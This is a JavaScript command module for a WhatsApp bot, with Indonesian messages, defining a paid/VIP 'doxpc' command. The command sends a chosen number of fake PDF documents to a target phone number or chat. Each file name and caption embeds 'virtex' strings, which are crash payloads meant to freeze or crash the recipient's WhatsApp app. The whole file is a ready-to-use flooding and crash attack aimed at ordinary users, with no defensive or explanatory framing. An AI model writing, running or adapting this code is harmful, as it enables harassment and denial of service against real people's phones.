const fs = require("fs") 
const chalk = require("chalk")
const { virtex } = require("@virtex/virtex")
module.exports = {
    commands: ["doxpc"],
    cooldown: 13,
    isSewa: true,
    isVip: true,
    callback: async ({ sock, m }) => {
    if (!m.input) return m.reply("Example : Doxpc 62xx Jumlah")
if (m.isMention) {
if (!m.text) return m.reply("Jumlah?") 
if (isNaN(m.args[1])) return m.reply("Itu bukan angka kak")
for (let i = 0; i < m.args[1]; i++) {
sock.sendMessage(m.input, { document: fs.readFileSync("./temp/Zzzzzzzzzz@4.0.4"), mimetype: 'application/pdf', fileName: `Https://wa.me/settings ${virtex}.${virtex}.${virtex}`, caption: `Https://wa.me/settings\n${virtex}\n${virtex}`}, { quoted: m })
}m.reply(`Succes!!`)} else if (m.quoted) {
if (!m.text) return m.reply("Jumlah?") 
if (isNaN(m.args[0])) return m.reply("Itu bukan angka kak")
for (let i = 0; i < m.args[0]; i++) {
sock.sendMessage(m.input, { document: fs.readFileSync("./temp/Zzzzzzzzzz@4.0.4"), mimetype: 'application/pdf', fileName: `Https://wa.me/settings ${virtex}.${virtex}.${virtex}`, caption: `Https://wa.me/settings\n${virtex}\n${virtex}`}, { quoted: m })
}m.reply(`Succes!!`)} else if (m.text != "" && !isNaN(m.args[0].replace(new RegExp("[()+-/ +/]", "gi"), ""))) {
if (!m.text) return m.reply("Jumlah?") 
if (isNaN(m.args[1])) return m.reply("Itu bukan angka kak")
const result = m.args[0].replace(new RegExp("[()+-/ +/]", "gi"), "") + "@s.whatsapp.net"
for (let i = 0; i < m.args[1]; i++) {
sock.sendMessage(result, { document: fs.readFileSync("./temp/Zzzzzzzzzz@4.0.4"), mimetype: 'application/pdf', fileName: `Https://wa.me/settings ${virtex}.${virtex}.${virtex}`, caption: `Https://wa.me/settings\n${virtex}\n${virtex}`}, { quoted: m })
}m.reply(`Succes!!`)}
    }
}




let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
    console.log(chalk.whiteBright("├"), chalk.keyword("red")("[ UPDATE ]"), `${__filename}`)
	delete require.cache[file]
	require(file)
})